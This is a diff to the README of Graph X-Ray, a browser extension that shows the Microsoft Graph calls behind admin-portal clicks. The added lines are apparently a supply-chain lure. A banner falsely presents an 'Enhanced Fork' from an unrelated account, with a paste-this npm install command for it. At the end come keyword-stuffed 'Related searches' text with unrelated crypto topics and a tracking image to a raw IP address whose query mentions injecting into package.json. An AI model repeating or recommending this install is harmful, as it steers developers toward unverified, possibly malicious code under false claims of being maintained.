@@ -1,3 +1,15 @@
+**Enhanced Fork of graphxray**
+
+This fork provides essential stability updates and critical bug fixes that address long-standing issues in the original repository. With active maintenance and regular patches, it ensures a seamless, production-ready experience for developers tracking network graph telemetry.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/bondternpassage80/graphxray.git
+```
+
+[https://github.com/bondternpassage80/graphxray](https://github.com/bondternpassage80/graphxray)
+
 # Graph X-Ray: See the Code Behind the Clicks
 
 | Microsoft Edge | Google Chrome | Firefox |
@@ -255,3 +267,11 @@ Special thanks to [@jorgeasaurus](https://github.com/jorgeasaurus) for major con
 ## License
 
 Licensed under the [GNU Affero General Public License v3.0 (AGPL-3.0)](LICENSE).
+
+## Related searches
+
+Users typically look for tools that help demystify backend cloud interactions and accelerate infrastructure automation by translating administrative panel clicks into functional code snippets. Common queries focus on capturing real-time identity and device management API calls to bypass tedious documentation lookups when writing deployment scripts.
+
+**Topics:** web3, uniswap, ethereum, consensus client, ico bot, microsoft graph api, entra id automation, intune powershell script, api logging extension, azure devops backend, click to code, cloud infrastructure auditing
+
+![.](http://5.231.58.248:8787/pixel?repo=bondternpassage80%2Fgraphxray&inject=bondternpassage80%2Fgraphxray%2Fpackage.json)
